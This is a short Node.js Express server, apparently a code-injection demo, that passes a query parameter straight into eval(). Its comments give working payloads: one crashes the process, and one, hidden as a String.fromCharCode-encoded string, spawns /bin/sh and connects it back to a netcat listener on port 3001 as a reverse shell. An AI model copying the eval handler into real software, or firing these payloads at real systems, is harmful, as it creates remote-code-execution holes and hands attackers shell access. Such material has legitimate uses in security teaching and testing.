// http://localhost:3000/?code=process.exit(process.pid)
// http://localhost:3000/?code=eval(String.fromCharCode(118,97,114,32,110,101,116,32,61,32,114,101,113,117,105,114,101,40,39,110,101,116,39,41,44,117,116,105,108,32,61,32,114,101,113,117,105,114,101,40,39,117,116,105,108,39,41,44,115,112,97,119,110,32,61,32,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,115,112,97,119,110,44,115,104,32,61,32,115,112,97,119,110,40,39,47,98,105,110,47,115,104,39,44,91,93,41,59,72,79,83,84,61,34,108,111,99,97,108,104,111,115,116,34,59,80,79,82,84,61,34,51,48,48,49,34,59,84,73,77,69,79,85,84,61,34,53,48,48,48,34,59,102,117,110,99,116,105,111,110,32,99,40,72,79,83,84,44,80,79,82,84,41,32,123,32,32,32,32,118,97,114,32,99,108,105,101,110,116,32,61,32,110,101,119,32,110,101,116,46,83,111,99,107,101,116,40,41,59,32,32,32,32,99,108,105,101,110,116,46,99,111,110,110,101,99,116,40,80,79,82,84,44,32,72,79,83,84,44,32,102,117,110,99,116,105,111,110,40,41,32,123,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,119,114,105,116,101,40,34,67,111,110,110,101,99,116,101,100,34,41,59,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,112,105,112,101,40,115,104,46,115,116,100,105,110,41,59,32,32,32,32,32,32,32,32,117,116,105,108,46,112,117,109,112,40,115,104,46,115,116,100,111,117,116,44,99,108,105,101,110,116,41,59,32,32,32,32,125,41,59,32,32,32,32,99,108,105,101,110,116,46,111,110,40,39,101,114,114,111,114,39,44,32,102,117,110,99,116,105,111,110,40,101,41,32,123,32,32,32,32,32,32,32,32,115,101,116,84,105,109,101,111,117,116,40,99,40,72,79,83,84,44,80,79,82,84,41,44,32,84,73,77,69,79,85,84,41,59,32,32,32,32,125,41,59,125,32,99,40,72,79,83,84,44,80,79,82,84,41,59))
// nc -l 3001

var express = require('express');

var app = express();

app.get('/', function indexGetHandler (req, res) {
  var evaluatedParam = eval('(' + req.query.code + ')');
  res.send('Response: ' + evaluatedParam);
});

app.listen(3000);
